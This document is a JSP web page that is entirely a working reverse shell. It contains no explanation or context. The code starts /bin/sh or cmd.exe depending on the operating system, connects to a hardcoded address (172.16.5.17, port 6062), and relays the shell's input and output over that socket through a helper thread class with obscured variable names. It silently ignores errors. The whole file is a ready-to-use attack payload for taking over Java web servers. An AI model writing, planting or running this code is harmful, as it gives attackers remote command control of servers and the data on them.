<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ma;
    OutputStream ty;

    StreamConnector( InputStream ma, OutputStream ty )
    {
      this.ma = ma;
      this.ty = ty;
    }

    public void run()
    {
      BufferedReader xh  = null;
      BufferedWriter tqk = null;
      try
      {
        xh  = new BufferedReader( new InputStreamReader( this.ma ) );
        tqk = new BufferedWriter( new OutputStreamWriter( this.ty ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xh.read( buffer, 0, buffer.length ) ) > 0 )
        {
          tqk.write( buffer, 0, length );
          tqk.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xh != null )
          xh.close();
        if( tqk != null )
          tqk.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
    String host = "172.16.5.17";
    int port = 6062;
    
    Socket socket = new Socket( host,port );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

